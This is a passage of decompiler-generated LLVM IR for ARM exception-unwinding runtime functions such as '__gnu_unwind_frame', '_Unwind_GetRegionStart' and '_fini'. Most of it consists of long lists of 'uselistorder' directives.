497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 6, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 804, 805, 806, 807, 808, 809, 810, 811, 812, 820, 821, 822, 823, 824 }
  uselistorder i32* @r7, { 396, 397, 398, 400, 401, 399, 402, 403, 404, 405, 0, 406, 407, 408, 420, 409, 410, 411, 412, 413, 414, 5, 415, 416, 417, 418, 419, 3, 1, 421, 69, 70, 71, 72, 108, 109, 110, 111, 112, 113, 422, 73, 6, 74, 75, 76, 7, 77, 78, 79, 80, 8, 81, 82, 9, 83, 84, 85, 10, 86, 87, 88, 89, 90, 11, 91, 92, 93, 94, 95, 12, 96, 97, 98, 99, 53, 54, 13, 55, 56, 57, 58, 59, 60, 14, 61, 62, 63, 64, 65, 66, 67, 68, 100, 104, 101, 102, 103, 105, 106, 107, 114, 115, 384, 385, 346, 347, 269, 270, 423, 424, 425, 426, 436, 437, 228, 229, 230, 231, 122, 123, 124, 125, 427, 428, 429, 430, 309, 310, 311, 312, 313, 386, 387, 388, 389, 176, 177, 15, 51, 52, 348, 349, 354, 355, 356, 357, 358, 359, 360, 350, 351, 352, 353, 329, 330, 331, 332, 333, 334, 361, 362, 363, 364, 365, 366, 367, 368, 16, 369, 370, 371, 314, 315, 316, 317, 318, 319, 282, 285, 286, 287, 283, 284, 271, 272, 273, 274, 275, 126, 129, 130, 131, 127, 128, 178, 179, 132, 133, 288, 291, 292, 293, 289, 290, 294, 295, 134, 137, 138, 139, 135, 136, 193, 194, 195, 196, 197, 202, 203, 204, 205, 198, 199, 200, 201, 206, 207, 208, 209, 210, 211, 180, 181, 140, 141, 142, 143, 144, 145, 212, 213, 390, 391, 146, 17, 147, 148, 431, 18, 432, 433, 434, 435, 214, 215, 216, 217, 218, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 45, 46, 34, 30, 19, 31, 2, 32, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 47, 48, 49, 50, 161, 162, 163, 164, 165, 166, 167, 116, 117, 118, 119, 120, 121, 168, 169, 170, 171, 172, 173, 174, 175, 182, 183, 20, 184, 185, 186, 187, 188, 189, 190, 191, 192, 219, 220, 221, 222, 223, 224, 225, 226, 227, 232, 233, 234, 235, 236, 237, 238, 239, 21, 240, 241, 242, 243, 244, 245, 246, 247, 22, 248, 249, 250, 24, 23, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 28, 264, 265, 266, 267, 268, 276, 29, 277, 278, 279, 280, 281, 26, 25, 296, 297, 298, 299, 300, 301, 4, 302, 303, 304, 305, 306, 307, 308, 320, 321, 322, 323, 324, 325, 326, 327, 328, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 374, 372, 373, 27, 375, 376, 377, 378, 379, 380, 381, 382, 383, 392, 393, 394, 395 }
  uselistorder i32* @lr, { 5, 0, 190, 191, 192, 193, 201, 194, 195, 196, 197, 3, 198, 199, 200, 202, 203, 204, 205, 206, 207, 209, 210, 7, 8, 211, 212, 213, 214, 215, 216, 217, 218, 219, 11, 12, 13, 14, 15, 16, 17, 18, 19, 9, 10, 20, 220, 221, 222, 223, 224, 229, 85, 86, 36, 37, 227, 228, 145, 146, 187, 188, 189, 225, 226, 162, 163, 164, 165, 166, 155, 156, 157, 167, 180, 181, 168, 169, 170, 171, 172, 173, 174, 4, 175, 176, 178, 179, 177, 147, 148, 139, 140, 132, 133, 38, 39, 6, 182, 183, 74, 75, 76, 77, 78, 79, 40, 41, 208, 80, 184, 87, 42, 43, 44, 45, 46, 47, 1, 51, 52, 53, 54, 55, 56, 48, 49, 50, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 2, 32, 33, 34, 35, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 81, 82, 83, 84, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 134, 135, 136, 137, 138, 141, 142, 143, 144, 149, 150, 151, 152, 153, 154, 158, 159, 160, 161, 185, 186 }
  uselistorder i32* @r6, { 496, 497, 498, 509, 499, 29, 500, 5, 501, 502, 6, 503, 504, 505, 506, 507, 508, 510, 1, 511, 512, 98, 99, 96, 97, 100, 513, 514, 7, 515, 516, 517, 518, 83, 84, 101, 8, 102, 103, 104, 105, 106, 25, 107, 108, 109, 9, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 81, 82, 85, 86, 87, 88, 10, 89, 90, 91, 11, 92, 93, 94, 95, 122, 30, 123, 26, 12, 13, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 485, 486, 487, 488, 521, 489, 14, 490, 491, 75, 15, 76, 16, 77, 519, 520, 438, 442, 443, 444, 445, 439, 440, 441, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 446, 471, 472, 473, 447, 448, 449, 450, 451, 17, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 467, 469, 463, 464, 465, 466, 468, 470, 145, 146, 2, 147, 33, 396, 397, 358, 359, 360, 361, 362, 351, 352, 148, 149, 150, 151, 152, 363, 364, 365, 366, 367, 153, 154, 155, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 156, 157, 158, 159, 160, 161, 162, 163, 164, 255, 18, 256, 257, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 34, 61, 189, 190, 191, 192, 193, 194, 195, 62, 196, 63, 64, 65, 66, 67, 35, 36, 37, 56, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 0, 58, 59, 60, 68, 69, 70, 71, 72, 73, 74, 197, 198, 4, 3, 199, 200, 201, 202, 203, 204, 205, 27, 206, 207, 208, 209, 210, 217, 218, 219, 220, 221, 211, 212, 213, 214, 215, 216, 135, 136, 19, 137, 138, 139, 140, 141, 142, 143, 144, 267, 268, 269, 270, 222, 223, 224, 225, 226, 227, 228, 232, 78, 79, 80, 229, 230, 231, 20, 233, 234, 235, 236, 237, 238, 239, 240, 258, 259, 260, 261, 28, 262, 263, 264, 21, 265, 266, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 31, 22, 310, 311, 313, 314, 312, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 353, 354, 355, 356, 357, 368, 369, 32, 23, 370, 371, 373, 374, 372, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 24, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 492, 493, 494, 495 }
  uselistorder label %dec_label_pc_19958, { 1, 0 }
  uselistorder label %dec_label_pc_198f4, { 1, 0 }
  uselistorder label %dec_label_pc_198a0, { 1, 0 }
  uselistorder label %dec_label_pc_19878, { 1, 0 }
  uselistorder label %dec_label_pc_197e4, { 1, 0 }
  uselistorder label %dec_label_pc_197c8, { 1, 0 }
  uselistorder label %dec_label_pc_197ac, { 1, 0 }
  uselistorder label %dec_label_pc_1975c, { 1, 0 }
  uselistorder label %dec_label_pc_19740, { 1, 0 }
  uselistorder label %dec_label_pc_196bc, { 1, 0 }
  uselistorder label %dec_label_pc_196a0, { 1, 0 }
  uselistorder label %dec_label_pc_195dc, { 2, 4, 5, 3, 0, 6, 7, 1 }
  uselistorder label %dec_label_pc_195ac, { 3, 4, 5, 0, 6, 2, 7, 1, 10, 11, 8, 9 }
  uselistorder label %dec_label_pc_19594, { 1, 0 }
  uselistorder label %dec_label_pc_19578, { 1, 0 }
  uselistorder label %dec_label_pc_192dc.backedge, { 2, 6, 4, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_19404, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_193f8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_193ec, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_1939c, { 1, 0 }
  uselistorder label %dec_label_pc_1938c, { 1, 0 }
  uselistorder label %dec_label_pc_19318, { 2, 1, 0 }
}

define i32 @__gnu_unwind_frame(i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %uws_-20 = alloca %anon_struct_13.3, align 8
  %v1_199e0 = add i32 %ucbp, 76
  %v2_199e0 = inttoptr i32 %v1_199e0 to i32*
  %v3_199e0 = load i32, i32* %v2_199e0, align 4
  %v1_199e4 = add i32 %v3_199e0, 4
  %v2_199e4 = inttoptr i32 %v1_199e4 to i32*
  %v3_199e4 = load i32, i32* %v2_199e4, align 4
  %v3_199ec = mul i32 %v3_199e4, 256
  %v4_199f4 = getelementptr inbounds %anon_struct_13.3, %anon_struct_13.3* %uws_-20, i32 0, i32 0
  store i32 %v3_199ec, i32* %v4_199f4, align 8
  %tmp7 = bitcast %anon_struct_13.3* %uws_-20 to %anon_struct_13*
  %v4_19a14 = call i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %tmp7)
  ret i32 %v4_19a14

; uselistorder directives
  uselistorder %anon_struct_13.3* %uws_-20, { 1, 0 }
  uselistorder i32 (i32, %anon_struct_13*)* @__gnu_unwind_execute, { 1, 0 }
  uselistorder i32 256, { 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 335, 326, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 320, 327, 324, 50, 325, 51, 53, 52, 54, 319, 55, 56, 57, 0, 323, 1, 58, 59, 60, 61, 62, 63, 64, 65, 67, 68, 69, 66, 70, 71, 72, 73, 75, 74, 76, 77, 78, 79, 80, 81, 82, 85, 84, 83, 86, 87, 88, 89, 328, 90, 91, 92, 93, 94, 329, 95, 96, 97, 98, 330, 99, 100, 101, 102, 103, 104, 105, 107, 106, 108, 110, 109, 111, 331, 112, 332, 121, 116, 122, 117, 118, 113, 114, 123, 119, 115, 120, 124, 125, 126, 127, 128, 129, 130, 131, 138, 135, 139, 136, 140, 137, 132, 133, 134, 141, 142, 143, 144, 145, 155, 151, 146, 156, 152, 157, 153, 147, 148, 149, 158, 154, 150, 159, 160, 161, 162, 163, 164, 165, 166, 2, 167, 168, 3, 177, 173, 178, 174, 169, 170, 171, 179, 175, 180, 176, 172, 181, 182, 183, 184, 185, 186, 196, 197, 191, 198, 192, 187, 188, 193, 199, 194, 200, 195, 189, 190, 201, 202, 203, 204, 209, 207, 205, 210, 208, 206, 211, 212, 216, 220, 221, 217, 213, 214, 218, 215, 219, 222, 223, 321, 333, 224, 226, 225, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 241, 239, 237, 242, 240, 238, 243, 244, 248, 252, 253, 249, 245, 246, 250, 247, 251, 254, 255, 322, 334, 256, 258, 257, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 4, 273, 274, 279, 286, 280, 287, 281, 275, 276, 288, 282, 277, 283, 289, 284, 278, 285, 290, 291, 292, 293, 294, 295, 296, 301, 308, 302, 309, 303, 297, 298, 310, 304, 299, 305, 311, 306, 300, 307, 312, 313, 314, 315, 316, 317, 318 }
  uselistorder i32 4, { 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 111, 515, 516, 517, 518, 519, 5, 522, 523, 520, 521, 524, 6, 525, 526, 527, 528, 7, 545, 8, 529, 530, 531, 532, 533, 9, 534, 10, 535, 536, 537, 538, 539, 540, 541, 11, 542, 149, 543, 544, 546, 547, 548, 549, 12, 550, 13, 261, 262, 263, 264, 280, 281, 551, 242, 243, 447, 248, 265, 14, 15, 554, 16, 17, 94, 89, 90, 18, 555, 91, 556, 74, 19, 20, 92, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 21, 574, 575, 576, 577, 578, 579, 73, 580, 581, 582, 583, 584, 585, 22, 23, 93, 586, 273, 112, 271, 272, 266, 267, 268, 269, 270, 244, 245, 246, 247, 249, 250, 251, 252, 253, 254, 24, 255, 113, 256, 257, 258, 259, 260, 150, 274, 275, 276, 277, 278, 279, 25, 282, 283, 284, 285, 326, 327, 286, 287, 288, 587, 26, 151, 114, 152, 589, 27, 590, 153, 240, 588, 85, 498, 499, 500, 501, 154, 75, 451, 452, 453, 454, 455, 456, 155, 156, 28, 457, 458, 459, 460, 461, 462, 463, 464, 157, 449, 450, 422, 423, 424, 425, 426, 427, 428, 429, 430, 29, 431, 432, 433, 465, 30, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 158, 159, 160, 480, 481, 484, 487, 482, 483, 115, 161, 485, 65, 486, 488, 489, 490, 492, 162, 32, 31, 491, 163, 164, 165, 296, 33, 34, 35, 166, 66, 36, 37, 328, 329, 330, 331, 332, 38, 333, 76, 552, 553, 215, 39, 40, 116, 297, 344, 77, 233, 117, 234, 121, 122, 167, 235, 298, 299, 41, 300, 95, 118, 119, 230, 236, 237, 120, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 0, 231, 232, 238, 239, 123, 69, 68, 301, 86, 302, 42, 303, 43, 71, 70, 305, 44, 304, 306, 307, 312, 124, 314, 125, 315, 126, 316, 317, 313, 308, 127, 309, 310, 311, 289, 168, 290, 67, 45, 291, 292, 46, 293, 78, 87, 128, 294, 295, 408, 318, 84, 83, 82, 319, 129, 47, 48, 49, 50, 51, 52, 320, 80, 79, 321, 81, 130, 322, 323, 324, 169, 241, 131, 325, 53, 334, 335, 336, 170, 337, 338, 339, 340, 171, 172, 132, 341, 133, 342, 96, 343, 345, 346, 173, 347, 348, 174, 175, 349, 97, 350, 98, 351, 352, 176, 353, 354, 177, 178, 355, 134, 356, 99, 357, 179, 180, 181, 358, 359, 135, 100, 360, 361, 182, 362, 363, 364, 183, 184, 1, 136, 365, 101, 366, 367, 368, 185, 369, 370, 186, 187, 2, 137, 371, 102, 372, 103, 373, 374, 375, 376, 188, 377, 378, 189, 190, 379, 380, 138, 381, 3, 382, 104, 383, 139, 384, 385, 386, 387, 191, 388, 389, 192, 193, 390, 391, 140, 392, 4, 393, 105, 394, 141, 395, 194, 195, 196, 396, 397, 142, 106, 398, 399, 400, 401, 197, 402, 403, 198, 199, 144, 404, 143, 405, 107, 406, 108, 407, 409, 410, 411, 412, 413, 146, 414, 147, 415, 200, 416, 72, 417, 201, 202, 148, 418, 145, 419, 109, 420, 110, 421, 203, 54, 434, 204, 55, 435, 205, 56, 436, 206, 57, 437, 207, 58, 438, 208, 88, 59, 439, 440, 209, 60, 441, 210, 61, 442, 211, 62, 443, 212, 63, 444, 213, 64, 445, 446, 448, 493, 494, 495, 496, 497, 502, 214, 503, 504 }
  uselistorder i32 76, { 18, 19, 20, 21, 22, 23, 0, 3, 5, 4, 6, 2, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 1 }
  uselistorder i32 1, { 761, 1364, 1365, 588, 1369, 1370, 1371, 1372, 629, 1373, 1374, 548, 563, 630, 1366, 1367, 1368, 1375, 589, 1376, 762, 162, 167, 165, 163, 168, 164, 166, 763, 764, 765, 766, 631, 632, 1377, 1378, 531, 769, 768, 767, 133, 135, 134, 136, 138, 137, 772, 771, 770, 66, 633, 634, 77, 1379, 391, 1380, 775, 774, 773, 145, 1381, 1382, 1383, 1384, 777, 776, 268, 270, 271, 269, 272, 140, 141, 540, 778, 402, 1051, 779, 403, 404, 405, 780, 98, 1052, 1053, 1054, 114, 113, 115, 116, 781, 95, 782, 14, 11, 12, 10, 13, 783, 594, 1024, 68, 69, 67, 73, 72, 1385, 564, 635, 1386, 1, 0, 784, 320, 316, 314, 315, 321, 319, 322, 317, 318, 313, 64, 636, 406, 785, 408, 409, 407, 549, 587, 550, 1308, 1309, 1310, 1311, 565, 786, 410, 788, 787, 411, 412, 1030, 789, 1055, 1056, 1057, 1388, 1059, 1058, 532, 790, 553, 1060, 554, 1389, 1026, 1025, 1390, 555, 1391, 1392, 1393, 1394, 1395, 1396, 986, 1397, 1398, 1399, 1400, 1401, 1402, 987, 754, 792, 791, 413, 417, 419, 415, 414, 416, 418, 420, 422, 421, 1064, 1061, 1062, 1063, 584, 556, 349, 350, 351, 352, 637, 1065, 1066, 1081, 1082, 793, 755, 81, 82, 1073, 988, 1074, 1075, 989, 1076, 1077, 1078, 1079, 1080, 110, 104, 105, 107, 111, 108, 106, 109, 103, 112, 1067, 1068, 1069, 638, 1070, 1071, 1072, 794, 426, 429, 427, 423, 430, 424, 425, 428, 431, 1083, 1084, 1085, 795, 252, 251, 248, 247, 246, 253, 249, 250, 254, 1086, 1087, 1088, 1089, 796, 341, 342, 340, 344, 343, 345, 797, 170, 1028, 639, 1027, 585, 800, 799, 798, 503, 509, 501, 505, 504, 508, 506, 507, 510, 502, 640, 1029, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 557, 801, 512, 511, 513, 517, 514, 515, 516, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 802, 117, 121, 124, 120, 118, 122, 119, 123, 641, 1041, 803, 144, 1090, 1091, 1092, 1093, 1094, 642, 804, 154, 155, 156, 158, 157, 643, 39, 805, 28, 27, 24, 25, 26, 22, 23, 806, 29, 30, 37, 38, 33, 34, 35, 36, 31, 32, 807, 307, 305, 306, 808, 432, 809, 100, 99, 810, 76, 75, 811, 71, 70, 812, 1184, 358, 361, 359, 360, 433, 171, 172, 813, 90, 89, 814, 148, 815, 816, 142, 143, 1403, 1404, 1405, 644, 1406, 1407, 645, 1408, 819, 818, 817, 43, 45, 51, 44, 49, 48, 52, 50, 46, 47, 820, 74, 646, 821, 434, 435, 436, 822, 442, 440, 441, 439, 437, 438, 823, 387, 388, 386, 389, 385, 824, 825, 169, 827, 826, 160, 828, 130, 1357, 831, 830, 829, 146, 147, 832, 91, 93, 92, 94, 558, 833, 390, 525, 533, 1358, 834, 303, 300, 301, 302, 304, 299, 1359, 1360, 1361, 835, 444, 443, 447, 450, 449, 448, 446, 452, 445, 451, 453, 159, 541, 1021, 1022, 1023, 836, 837, 551, 1157, 552, 1158, 1159, 542, 1160, 455, 459, 454, 457, 458, 461, 462, 460, 456, 1161, 1409, 566, 647, 839, 838, 840, 1313, 1316, 1317, 1318, 841, 463, 468, 469, 467, 466, 470, 464, 465, 1319, 1320, 1321, 1322, 842, 475, 481, 474, 480, 479, 473, 483, 482, 477, 471, 476, 472, 478, 1314, 1315, 648, 382, 384, 383, 139, 1297, 649, 1298, 1299, 1300, 1301, 1302, 843, 222, 223, 221, 224, 1323, 132, 131, 1324, 1325, 1326, 1327, 1328, 1329, 595, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 651, 1338, 1339, 1340, 1341, 1342, 650, 1343, 1344, 1345, 1346, 1347, 844, 486, 488, 484, 487, 492, 494, 491, 493, 495, 489, 490, 485, 102, 101, 652, 653, 546, 848, 847, 846, 845, 274, 40, 559, 311, 849, 330, 329, 41, 850, 218, 217, 851, 245, 852, 496, 853, 854, 497, 855, 288, 856, 498, 857, 858, 499, 859, 256, 255, 860, 287, 286, 861, 258, 257, 862, 863, 500, 864, 151, 150, 865, 523, 866, 1211, 1212, 297, 298, 991, 992, 993, 994, 995, 996, 997, 1410, 378, 379, 380, 381, 867, 1185, 654, 83, 84, 1095, 868, 97, 96, 655, 1186, 869, 85, 86, 656, 870, 310, 308, 309, 1187, 871, 184, 183, 182, 872, 393, 392, 873, 874, 153, 152, 875, 339, 876, 518, 877, 273, 878, 220, 219, 879, 149, 881, 880, 236, 237, 883, 882, 87, 88, 65, 526, 1387, 188, 187, 1188, 1189, 1190, 1191, 539, 1192, 885, 884, 180, 179, 174, 177, 175, 176, 181, 173, 178, 2, 1162, 1163, 1164, 1165, 1213, 560, 1214, 561, 1215, 887, 886, 519, 1193, 1194, 1195, 1196, 888, 1304, 1305, 567, 3, 536, 4, 1306, 1096, 1097, 1098, 657, 1197, 520, 1348, 369, 1199, 1198, 1200, 161, 1216, 227, 1231, 889, 128, 127, 126, 125, 129, 1217, 890, 285, 284, 283, 282, 658, 1016, 659, 1017, 596, 1018, 1125, 661, 1126, 1019, 1003, 998, 663, 547, 999, 1000, 664, 1001, 1002, 668, 1004, 1005, 1006, 665, 1007, 1008, 669, 1009, 1010, 666, 1011, 1012, 667, 662, 1013, 1014, 1015, 670, 671, 1020, 569, 672, 673, 1127, 1128, 1129, 674, 1130, 1131, 1132, 675, 568, 1133, 990, 1136, 1135, 660, 1134, 1137, 1138, 676, 1139, 1140, 1141, 570, 1148, 1149, 543, 677, 903, 902, 901, 900, 899, 898, 897, 896, 895, 894, 893, 892, 891, 195, 193, 194, 192, 196, 197, 1142, 1143, 678, 1144, 1145, 679, 1146, 1147, 263, 262, 261, 267, 264, 265, 266, 260, 259, 680, 681, 905, 904, 521, 522, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 527, 538, 1106, 1107, 571, 528, 1108, 1109, 1110, 1111, 529, 537, 1112, 1113, 572, 530, 1114, 682, 1115, 1116, 683, 1117, 684, 1118, 1119, 562, 1122, 1120, 1121, 534, 535, 1123, 685, 1124, 913, 757, 912, 911, 910, 909, 908, 907, 756, 906, 373, 374, 377, 372, 376, 371, 370, 375, 914, 225, 1289, 578, 915, 62, 61, 60, 59, 63, 57, 55, 56, 58, 53, 54, 1218, 917, 916, 279, 280, 278, 277, 276, 275, 281, 688, 597, 1150, 1151, 598, 1152, 1153, 686, 687, 689, 1154, 1155, 690, 691, 692, 693, 694, 695, 696, 930, 929, 928, 927, 926, 925, 924, 923, 922, 921, 760, 920, 919, 918, 79, 80, 78, 697, 544, 698, 931, 699, 700, 701, 704, 703, 702, 1156, 933, 932, 705, 1166, 583, 1167, 582, 1168, 581, 1169, 580, 1170, 579, 1171, 1172, 706, 586, 707, 1173, 708, 1174, 709, 1175, 710, 1176, 711, 1177, 712, 1178, 713, 1179, 714, 1180, 715, 1181, 716, 1182, 717, 1183, 545, 718, 946, 945, 944, 943, 942, 941, 940, 939, 938, 937, 936, 935, 934, 353, 354, 356, 355, 357, 1201, 1207, 6, 573, 1202, 719, 1203, 5, 1204, 590, 1205, 574, 575, 1206, 1208, 1209, 591, 1210, 758, 950, 949, 759, 948, 947, 226, 1290, 599, 600, 1291, 7, 8, 9, 1219, 1220, 1221, 1222, 1223, 592, 593, 720, 1224, 1225, 721, 1226, 1227, 722, 1228, 1230, 1229, 954, 953, 952, 951, 291, 293, 295, 296, 294, 289, 292, 290, 1232, 1233, 1234, 723, 724, 956, 955, 324, 327, 328, 323, 326, 325, 1235, 1236, 1237, 725, 1238, 726, 602, 601, 727, 1239, 957, 333, 336, 337, 338, 335, 331, 334, 332, 1240, 1241, 728, 1242, 603, 576, 729, 958, 346, 347, 1243, 1244, 1245, 730, 1246, 731, 732, 1247, 604, 1248, 959, 229, 233, 234, 235, 232, 228, 231, 230, 1249, 1250, 1251, 733, 1252, 734, 606, 605, 735, 1253, 736, 1254, 960, 211, 209, 214, 215, 216, 213, 207, 212, 208, 210, 1255, 1256, 1257, 1258, 1259, 737, 1260, 738, 1261, 739, 611, 610, 740, 1262, 607, 1263, 608, 1264, 609, 1265, 966, 965, 964, 963, 962, 961, 241, 242, 243, 244, 238, 240, 239, 1266, 1267, 1268, 1269, 1270, 741, 1271, 742, 1272, 743, 620, 619, 744, 1273, 618, 1274, 617, 1275, 612, 1276, 613, 1277, 614, 1278, 615, 1279, 616, 1280, 972, 971, 970, 969, 968, 967, 365, 366, 368, 367, 362, 364, 363, 1281, 1282, 745, 1283, 621, 577, 746, 973, 185, 186, 1284, 1285, 1286, 747, 624, 623, 748, 1287, 622, 1288, 974, 394, 395, 399, 400, 401, 398, 397, 396, 1292, 1293, 1294, 749, 627, 626, 750, 1295, 625, 1296, 979, 978, 977, 976, 975, 198, 199, 204, 205, 206, 203, 202, 201, 200, 1303, 628, 751, 980, 189, 190, 191, 1307, 981, 348, 1312, 982, 42, 1349, 1352, 752, 1353, 1354, 1350, 1351, 1355, 1356, 17, 18, 20, 19, 16, 21, 1362, 753, 983, 312, 1363, 15, 984, 985, 524 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_19a40 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_19a48 = add i32 %tmp1, 72
  %v2_19a48 = inttoptr i32 %v1_19a48 to i32*
  %v3_19a48 = load i32, i32* %v2_19a48, align 4
  ret i32 %v3_19a48

; uselistorder directives
  uselistorder i32 72, { 10, 11, 0, 12, 2, 3, 1, 4, 7, 8, 5, 6, 9 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 9, 8, 11, 10, 170, 171, 172, 173, 15, 16, 64, 17, 174, 56, 12, 175, 176, 177, 178, 179, 181, 182, 180, 183, 184, 185, 186, 187, 188, 189, 18, 19, 20, 21, 23, 22, 24, 57, 58, 25, 26, 59, 60, 61, 62, 63, 65, 66, 86, 67, 68, 190, 6, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 3, 124, 125, 126, 127, 128, 27, 129, 147, 28, 29, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 166, 159, 160, 161, 162, 163, 164, 165, 167, 168, 30, 169, 4, 87, 88, 31, 89, 90, 91, 32, 69, 41, 51, 52, 53, 70, 71, 54, 42, 43, 44, 45, 46, 47, 48, 49, 50, 55, 33, 34, 35, 72, 73, 74, 7, 75, 76, 77, 78, 80, 81, 40, 82, 36, 83, 85, 84, 79, 5, 119, 92, 37, 93, 94, 95, 96, 97, 98, 99, 38, 100, 101, 102, 39, 103, 104, 105, 106, 107, 108, 13, 109, 110, 111, 112, 113, 114, 14, 115, 116, 117, 118, 120, 121, 122, 123, 0, 1, 2 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_19a5c = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_19a5c)
  %v31_19a64 = load i32, i32* @r0, align 4
  ret i32 %v31_19a64

; uselistorder directives
  uselistorder i32* @r0, { 13, 14, 15, 259, 260, 261, 16, 42, 79, 90, 262, 265, 266, 70, 17, 263, 264, 241, 48, 8, 267, 9, 18, 80, 0, 81, 10, 11, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 1, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 82, 19, 71, 72, 73, 74, 75, 76, 77, 78, 83, 84, 85, 86, 87, 88, 89, 45, 257, 46, 258, 20, 21, 22, 23, 172, 173, 294, 295, 297, 60, 61, 62, 63, 24, 196, 197, 2, 25, 26, 95, 96, 3, 27, 28, 298, 299, 4, 29, 30, 226, 227, 5, 31, 32, 68, 69, 296, 157, 91, 243, 33, 57, 58, 244, 6, 245, 246, 247, 235, 55, 236, 237, 238, 56, 239, 240, 34, 255, 248, 249, 250, 251, 252, 253, 254, 97, 98, 35, 228, 36, 229, 218, 37, 219, 212, 38, 213, 99, 39, 100, 220, 40, 221, 101, 41, 102, 103, 43, 44, 174, 175, 176, 177, 104, 47, 105, 49, 50, 178, 179, 180, 181, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 